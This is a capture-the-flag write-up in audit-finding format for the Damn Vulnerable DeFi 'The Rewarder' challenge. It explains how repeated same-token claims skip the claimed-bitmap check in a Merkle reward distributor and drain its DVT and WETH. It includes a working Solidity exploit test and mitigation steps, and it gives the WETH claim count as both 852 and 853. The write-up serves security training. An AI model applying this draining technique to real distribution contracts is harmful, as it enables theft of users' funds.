### [H-1] Repeated same-token claims drain distributor via unchecked bitmap accumulation

**Description:** In `TheRewarderDistributor`, the `claimRewards()` function transfers 
tokens on every loop iteration but only calls `_setClaimed()` when the token changes 
or on the last iteration. When the same token is submitted repeatedly in the 
`inputClaims` array, the `else` branch accumulates the transfer amount and keeps 
transferring without any bitmap check — allowing unlimited transfers before 
`_setClaimed()` fires once at the end with the total accumulated amount.

**Impact:** An attacker in the Merkle distribution can drain the entire DVT and WETH 
distributor balance in a single transaction by submitting thousands of repeated 
same-token claims. Only one valid allocation and Merkle proof is required — the 
attacker's own — making this exploitable by any eligible beneficiary.

**Proof of Concept:**
1. Build a claims array with 852 WETH claims followed by 867 DVT claims.
2. Submit via `claimRewards()` — the `else` branch transfers WETH 852 times 
   without bitmap check.
3. When token changes to DVT, `_setClaimed(WETH, 852*amount)` fires once — 
   passing because the WETH bit was never set.
4. DVT transfers 867 times via the same `else` branch accumulation.
5. Last iteration fires `_setClaimed(DVT, 867*amount)` — passing once.
6. Transfer all drained tokens to recovery.

<details>
<summary>Example Code Snippet</summary>

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    uint256 playerWethAmount = 1171088749244340;
    uint256 playerDvtAmount = 11524763827831882;
    uint256 playerIndex = 188;
    uint256 dvtNumber = 867;
    uint256 wethNumber = 853;

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    Claim[] memory claims = new Claim[](dvtNumber + wethNumber);

    // 853 WETH claims — else branch transfers without bitmap check
    for (uint256 i = 0; i < wethNumber; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: playerWethAmount,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, playerIndex)
        });
    }

    // 867 DVT claims — token change triggers _setClaimed(WETH) then accumulates DVT
    for (uint256 i = 0; i < dvtNumber; i++) {
        claims[wethNumber + i] = Claim({
            batchNumber: 0,
            amount: playerDvtAmount,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, playerIndex)
        });
    }

    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```
</details>

**Recommended Mitigation:**
1. Move `_setClaimed()` inside the loop — call it on every individual claim 
   before executing the transfer, not once for accumulated totals.
2. Validate each claim independently — the bitmap check must happen per 
   iteration, not per token group.
3. Separate transfer from accumulation — never transfer tokens before the 
   claimed bitmap is updated, following the checks-effects-interactions pattern.